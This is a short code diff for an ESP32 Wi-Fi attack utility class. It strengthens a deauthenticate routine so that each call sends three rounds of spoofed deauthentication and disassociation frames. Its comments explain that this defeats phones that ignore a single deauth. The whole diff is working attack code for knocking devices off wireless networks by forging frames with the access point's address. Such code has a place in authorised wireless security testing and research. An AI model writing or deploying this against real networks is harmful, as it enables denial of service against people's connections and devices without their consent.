@@ -20,10 +20,13 @@ WifiAttackUtil::~WifiAttackUtil()
   _sequenceNumber = 0;
 }
 
+esp_err_t WifiAttackUtil::setChannel(uint8_t channel)
+{
+  return esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+}
+
 esp_err_t WifiAttackUtil::_changeChannel(const uint8_t channel) noexcept
 {
-  // Always set channel — external code (e.g. promiscuous scan) may change it
-  // behind our back, making any cached value stale
   return esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
 }
 
@@ -115,11 +118,18 @@ esp_err_t WifiAttackUtil::deauthenticate(const MacAddr ap, const MacAddr bssid, 
   memcpy(&_deauthFrame[4],  ap,    6);
   memcpy(&_deauthFrame[10], bssid, 6);
   memcpy(&_deauthFrame[16], bssid, 6);
-  memcpy(&_deauthFrame[22], &_sequenceNumber, 2);
-  _sequenceNumber++;
 
-  res = _sendPacket(_deauthFrame, sizeof(_deauthFrame));
-  if (res == ESP_OK) return ESP_OK;
-  _deauthFrame[0] = 0xa0;
-  return _sendPacket(_deauthFrame, sizeof(_deauthFrame));
+  // Send multiple deauth + disassoc frames for effectiveness
+  // Some devices (especially phones) ignore single broadcast deauth
+  for (int i = 0; i < 3; i++) {
+    memcpy(&_deauthFrame[22], &_sequenceNumber, 2);
+    _sequenceNumber++;
+    _deauthFrame[0] = 0xc0;  // deauth
+    _sendPacket(_deauthFrame, sizeof(_deauthFrame));
+    _deauthFrame[0] = 0xa0;  // disassoc
+    _sendPacket(_deauthFrame, sizeof(_deauthFrame));
+    vTaskDelay(1 / portTICK_PERIOD_MS);
+  }
+
+  return ESP_OK;
 }
